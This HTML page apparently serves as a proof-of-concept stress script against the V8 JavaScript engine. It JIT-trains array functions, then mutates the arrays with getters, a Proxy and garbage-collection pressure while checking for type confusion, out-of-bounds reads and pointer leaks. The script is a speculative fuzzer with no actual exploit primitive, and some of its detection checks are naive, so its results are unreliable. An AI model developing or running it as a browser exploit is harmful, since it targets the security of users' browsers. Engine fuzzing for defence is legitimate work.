<!doctype html>
<meta charset="utf-8">
<title>V8 Extreme Crash PoC</title>

<h2>V8 Extreme Stress PoC v2</h2>
<pre id="log"></pre>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
    console.log(m);
};

// =======================
// TARGET FUNCTIONS
// =======================
function vuln(a, i) { return a[i] + 1.1; }
function target(a, i) { return a[i] + 1.1; }

// =======================
// JIT TRAINING
// =======================
function warmup() {
    let arr = Array.from({length: 50}, (_, i) => i + 0.5);
    for (let i = 0; i < 50000; i++) {
        vuln(arr, i % 50);
        target(arr, i % 50);
    }
    return arr;
}

// =======================
// AGGRESSIVE MUTATIONS
// =======================
function mutate(arr) {
    delete arr[5];
    arr.length = 20;
    arr[60] = 13.37;
    arr[4] = {x: 1};
    Object.defineProperty(arr, 3, {
        get() { return 1.1; }
    });
    return arr;
}

function breakAssumption(a) {
    delete a[10];
    a.length = 20;
    a[80] = 13.37;
    a[5] = {x:1};
    Object.defineProperty(a,3,{
        get() { a.push(99.9); return 1.1; }
    });
    a = new Proxy(a, {
        get(t,p) {
            if (p==="length") t.push(13.37);
            return Reflect.get(t,p);
        }
    });
    return a;
}

// =======================
// TYPED ARRAYS
// =======================
let buf = new ArrayBuffer(0x1000);
let f64 = new Float64Array(buf);
let u32 = new Uint32Array(buf);
let u8  = new Uint8Array(buf);

// =======================
// GC PRESSURE
// =======================
function gc() {
    let t=[];
    for(let i=0;i<50;i++) t.push(new ArrayBuffer(1024*1024));
}

// =======================
// CHECKS
// =======================
function checkArray(a){
    for(let i=0;i<a.length+50;i++){
        let v=a[i];
        if(typeof v!=="number" && typeof v!=="object" && v!==undefined){
            log("TYPE BREAK "+i+" "+v); return true;
        }
        if(typeof v==="number" && Math.abs(v)>1e12){
            log("POINTER LIKE "+v); return true;
        }
    }
    if(a[a.length+10]!==undefined){
        log("OOB READ "+a[a.length+10]); return true;
    }
    return false;
}

function checkTyped(){
    for(let i=0;i<f64.length;i++){
        let v=f64[i];
        if(!Number.isFinite(v)){ log("FLOAT CORRUPTION "+v); return true; }
        if(Math.abs(v)>1e12){ log("PTR LEAK "+v); return true; }
    }
    return false;
}

// =======================
// MAIN EXTREME LOOP
// =======================
function run(){
    log("[*] warmup / JIT");
    let base = warmup();

    log("[*] extreme fuzzing...");
    for(let i=0;i<100000;i++){
        let arr=[...base];
        arr = mutate(arr);
        arr = breakAssumption(arr);

        vuln(arr,5);
        target(arr,4);

        f64[i % f64.length] = i+0.5;
        u32[i % u32.length] = i;
        u8[i % u8.length] = i & 0xff;

        if(i%20===0) gc();

        if(checkArray(arr)){ log("⚠ ARRAY BREAK"); return; }
        if(checkTyped()){ log("⚠ TYPED ARRAY CORRUPTION"); return; }
        if(i%500===0) log("iter "+i);
    }
    log("[*] finished");
}

run();
</script>
